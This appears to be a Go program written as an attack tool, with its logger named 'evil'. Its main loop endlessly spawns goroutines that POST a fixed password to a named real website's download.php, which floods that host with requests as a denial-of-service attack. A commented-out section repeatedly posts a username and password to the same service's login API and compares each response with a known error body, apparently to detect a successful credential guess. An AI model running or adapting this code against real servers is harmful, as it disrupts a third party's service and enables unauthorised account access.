/**
 * Createby GoLand
 * User xzw jsjxzw@163.com
 * Date 2021/2/25
 * Time 2:47 下午
 */

package main

import (
	"net/http"
	"net/url"
	"os"

	"github.com/op/go-logging"
)

var logger = logging.MustGetLogger("evil")

var Err []byte

func init() {
	format := logging.MustStringFormatter(`[%{module}] %{time:2006-01-02 15:04:05} [%{longpkg} %{shortfile} { %{message} }]`)
	backendConsole := logging.NewLogBackend(os.Stderr, "", 0)
	backendConsole2Formatter := logging.NewBackendFormatter(backendConsole, format)
	logging.SetBackend(backendConsole2Formatter)
}

func main() {
	for true {

		//logger.Info(">>>>>>>>>>>> ", nonce)
		//go http.PostForm("https://server.user.castim.cn/v1/auth/login",
		//	url.Values{"username": {"123456@qq.com12"}, "password": {"Qwe123456"}})

		go http.PostForm("https://www.castim.cn/download.php",
			url.Values{"pwd": {"123456"}})

		/**
			resp, err := http.PostForm("https://server.user.castim.cn/v1/auth/login",
				url.Values{"username": {"123456@qq.com"}, "password": {"Qwe123456"}})
			if err != nil {
				//logger.Error(err)
				continue
			}
			//logger.Info(resp.StatusCode, resp.Status)
			body, err := ioutil.ReadAll(resp.Body)
			logger.Info(string(body))
			if err != nil {
				//logger.Error(err)
				continue
			}
			if i == 200000 {
				Err = body[:20]
				//logger.Info(string(Err))
				continue
			}
			if bytes.Equal(body[:20], Err) {
				//logger.Info("error")
				continue
			}
			//logger.Info(string(body))
			//break

		}
		//logger.Warning("not found")

		*/
	}
}
